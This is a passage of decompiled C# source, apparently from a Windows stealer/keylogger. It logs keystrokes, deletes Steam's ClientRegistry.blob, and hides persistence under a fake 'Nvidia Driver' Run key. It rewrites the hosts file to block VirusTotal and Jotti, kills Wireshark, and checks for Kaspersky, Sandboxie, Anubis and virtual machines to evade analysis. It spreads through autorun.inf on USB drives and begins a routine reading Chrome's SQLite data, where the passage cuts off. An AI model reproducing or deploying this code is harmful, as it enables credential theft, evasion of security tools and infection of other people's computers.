				vmethod_22().set_Text(vmethod_22().get_Text() + "o");
			}
			else if ((int)Key == 80)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "p");
			}
			else if ((int)Key == 81)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "q");
			}
			else if ((int)Key == 82)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "r");
			}
			else if ((int)Key == 83)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "s");
			}
			else if ((int)Key == 84)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "t");
			}
			else if ((int)Key == 85)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "u");
			}
			else if ((int)Key == 86)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "v");
			}
			else if ((int)Key == 87)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "w");
			}
			else if ((int)Key == 88)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "x");
			}
			else if ((int)Key == 89)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "y");
			}
			else if ((int)Key == 90)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "z");
			}
			else if ((int)Key == 188)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[");
			}
			else if ((int)Key == 221)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DEL]");
			}
			else if ((int)Key == 8)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DEL]");
			}
			else if ((int)Key == 40)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DOWN ARROW]");
			}
			else if ((int)Key == 38)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[UP ARROW]");
			}
			else if ((int)Key == 37)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[LEFT ARROW]");
			}
			else if ((int)Key == 39)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[RIGHT ARROW]");
			}
			else if ((int)Key == 9)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "*");
			}
		}
		else if (((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & !((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "!");
			}
			else if ((int)Key == 50)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "@");
			}
			else if ((int)Key == 51)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "#");
			}
			else if ((int)Key == 52)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "$");
			}
			else if ((int)Key == 53)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "%");
			}
			else if ((int)Key == 54)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "^");
			}
			else if ((int)Key == 55)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "&");
			}
			else if ((int)Key == 56)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "*");
			}
			else if ((int)Key == 57)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "(");
			}
			else if ((int)Key == 48)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ")");
			}
			else if ((int)Key == 65)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "G");
			}
			else if ((int)Key == 72)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "Z");
			}
			else if ((int)Key == 188)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "<");
			}
			else if ((int)Key == 189)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "_");
			}
			else if ((int)Key == 219)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "{");
			}
			else if ((int)Key == 221)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "}");
			}
			else if ((int)Key == 191)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "?");
			}
			else if ((int)Key == 220)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "|");
			}
			else if ((int)Key == 186)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ":");
			}
			else if ((int)Key == 190)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ">");
			}
			else if ((int)Key == 192)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "~");
			}
			else if ((int)Key == 32)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DEL]");
			}
			else if ((int)Key == 8)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DEL]");
			}
			else if ((int)Key == 40)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DOWN ARROW]");
			}
			else if ((int)Key == 38)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[UP ARROW]");
			}
			else if ((int)Key == 37)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[LEFT ARROW]");
			}
			else if ((int)Key == 39)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[RIGHT ARROW]");
			}
			else if ((int)Key == 9)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "*");
			}
		}
	}

	public void St3amKill()
	{
		try
		{
			string text = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Valve\\Steam\\", "SteamPath", (object)null));
			((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(text + "\\ClientRegistry.blob");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void AddStartup()
	{
		string text = Application.get_ExecutablePath().ToString();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		folderPath = Path.Combine(folderPath, "nvdisp.exe");
		try
		{
			File.Copy(text, folderPath, overwrite: false);
			text = folderPath;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia Driver") == null)
			{
				registryKey.SetValue("Nvidia Driver", folderPath);
			}
			registryKey.Close();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey2.GetValue("Nvidia driver") == null)
			{
				registryKey2.SetValue("Nvidia driver", text);
			}
			registryKey2.Close();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	[DebuggerNonUserCode]
	private virtual GClass2 vmethod_24()
	{
		return gclass2_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	private virtual void vmethod_25(GClass2 gclass2_1)
	{
		GClass2.GDelegate0 gdelegate0_ = shiftandcaps;
		if (gclass2_0 != null)
		{
			GClass2.smethod_1(gdelegate0_);
		}
		gclass2_0 = gclass2_1;
		if (gclass2_0 != null)
		{
			GClass2.smethod_0(gdelegate0_);
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_29, int int_1);

	private string method_0()
	{
		string string_ = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref string_, 100);
		return string_.Substring(0, checked(Strings.InStr(string_, "\0", (CompareMethod)0) - 1));
	}

	public void Hosts()
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
			string path = folderPath + "\\drivers\\etc\\\\hosts";
			if ((File.GetAttributes(path) & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(path, FileAttributes.Normal);
			}
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.System);
			string path2 = folderPath2 + "\\drivers\\etc\\\\hosts";
			StreamWriter streamWriter = new StreamWriter(path2);
			streamWriter.Write("##Do not touch this file, changing it will cause SERIOUS damage to your computer");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.rsbot.org/vb/");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 rsbot.org/vb/");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 85.25.184.47");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.rsbot.com");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.rsbot.com");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.rsbot.org");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.rsbot.org");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 virustotal.com");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.virustotal.com");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.virusscan.jotti.org/");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.virusscan.jotti.org/en");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.virusscan.jotti.org/en");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.rsbots.net");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 rsbots.net");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.RSbots.net");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.AutoFighter.org");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.RSBotting.com");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.RSTrainers.com");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.CodeSpace.net");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.RsAutoCheats.com");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.XxBots.net");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.AutoFarmer.org");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("127.0.0.1 www.kMiner.org");
			streamWriter.Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void seekanddestroy(string process__1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.Contains(process__1))
			{
				process.Kill();
			}
		}
	}

	public bool antiKAV()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					flag = Process.GetProcessesByName("avp").Length >= 1;
					goto end_IL_0000;
				case 37:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_005b;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 37;
				continue;
			}
			break;
			IL_005b:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void method_1()
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			string mainWindowTitle = process.MainWindowTitle;
			if (string.Equals(mainWindowTitle, "The Wireshark Network Analyzer"))
			{
				process.Kill();
			}
		}
	}

	public bool antiSandboxie()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					flag = Process.GetProcessesByName("SbieSvc").Length >= 1;
					goto end_IL_0000;
				case 37:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_005b;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 37;
				continue;
			}
			break;
			IL_005b:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public bool antiAnubis()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					string startupPath = Application.get_StartupPath();
					string text = startupPath + "\\sample.exe";
					flag = ((Operators.CompareString(Application.get_ExecutablePath(), text, false) == 0) ? true : false);
					goto end_IL_0000;
				}
				case 55:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_006f;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 55;
				continue;
			}
			break;
			IL_006f:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public bool antiAnubis2()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					flag = (Operators.ConditionalCompareObjectEqual(object_1, (object)string_26, false) ? true : false);
					goto end_IL_0000;
				case 42:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_0060;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 42;
				continue;
			}
			break;
			IL_0060:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public bool AntiVirtualBox()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					method_2();
					string text = string_24;
					flag = ((Operators.CompareString(text, "VirtualBox Graphics Adapter", false) == 0) ? true : false);
					goto end_IL_0000;
				}
				case 50:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_0068;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 50;
				continue;
			}
			break;
			IL_0068:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public bool AntiVmWare()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					method_2();
					string text = string_24;
					flag = ((Operators.CompareString(text, "VMware SVGA II", false) == 0) ? true : false);
					goto end_IL_0000;
				}
				case 50:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_0068;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 50;
				continue;
			}
			break;
			IL_0068:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public bool AntiVirtualPC()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					method_2();
					string text = string_24;
					flag = ((Operators.CompareString(text, "VM Additions S3 Trio32/64", false) == 0) ? true : false);
					goto end_IL_0000;
				}
				case 50:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_0068;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 50;
				continue;
			}
			break;
			IL_0068:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void method_2()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					object @object = Interaction.GetObject("winmgmts:", (string)null);
					object[] array = new object[1] { string_25 };
					bool[] array2 = new bool[1] { true };
					object obj = NewLateBinding.LateGet(@object, (Type)null, "ExecQuery", array, (string[])null, (Type[])null, array2);
					if (array2[0])
					{
						string_25 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
					}
					object_0 = RuntimeHelpers.GetObjectValue(obj);
					IEnumerator enumerator = ((IEnumerable)object_0).GetEnumerator();
					while (enumerator.MoveNext())
					{
						object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
						string_24 = Conversions.ToString(NewLateBinding.LateGet(objectValue, (Type)null, "Description", new object[0], (string[])null, (Type[])null, (bool[])null));
					}
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					goto end_IL_0000;
				}
				case 217:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_0113;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 217;
				continue;
			}
			break;
			IL_0113:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void USBSpread()
	{
		string sourceFileName = Application.get_ExecutablePath().ToString();
		DriveInfo[] drives = DriveInfo.GetDrives();
		try
		{
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				if (driveInfo.DriveType == DriveType.Removable)
				{
					string path = driveInfo.Name + "autorun.inf";
					StreamWriter streamWriter = new StreamWriter(path);
					streamWriter.WriteLine("[autorun]\n");
					streamWriter.WriteLine("open=start.exe");
					streamWriter.WriteLine("action=Run VMCLite");
					streamWriter.Close();
					File.SetAttributes(driveInfo.Name + "autorun.inf", File.GetAttributes(driveInfo.Name + "autorun.inf") | FileAttributes.Hidden);
					try
					{
						File.Copy(sourceFileName, driveInfo.Name + "start.exe", overwrite: true);
						File.SetAttributes(driveInfo.Name + "start.exe", File.GetAttributes(driveInfo.Name + "start.exe") | FileAttributes.Hidden);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public string GetDecryptedData(string Data)
	{
		byte[] bytes = Convert.FromBase64String(Data);
		return Encoding.ASCII.GetString(bytes);
	}

	public void GetChrome()
	{
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		SQLiteConnection val = default(SQLiteConnection);
		SQLiteCommand val2 = default(SQLiteCommand);
		SQLiteDataReader val3 = default(SQLiteDataReader);
		ListViewItem val4 = default(ListViewItem);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 587:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001e;
						case 4:
							goto IL_002c;
						case 5:
							goto IL_0036;
						case 6:
							goto IL_0050;
						case 7:
							goto IL_005a;
						case 8:
							goto IL_0065;
						case 9:
							goto IL_0073;
						case 12:
							goto IL_0084;
						case 13:
							goto IL_009a;
